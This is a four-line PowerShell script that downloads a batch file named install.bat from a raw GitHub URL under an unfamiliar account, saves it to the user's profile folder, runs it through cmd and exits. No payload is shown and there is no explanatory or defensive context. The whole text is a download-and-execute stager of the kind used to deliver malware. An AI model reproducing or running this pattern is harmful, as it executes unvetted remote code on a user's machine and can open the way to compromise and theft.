[Uri]$uri = 'https://github.com/userdev265scratchandpython/home4anybrowser/raw/main/install.bat'
Invoke-WebRequest -Uri $uri -Method Get -OutFile "$env:USERPROFILE\install.bat"
Start-Process -FilePath "cmd" -ArgumentList "/c", "$env:USERPROFILE\install.bat"
exit
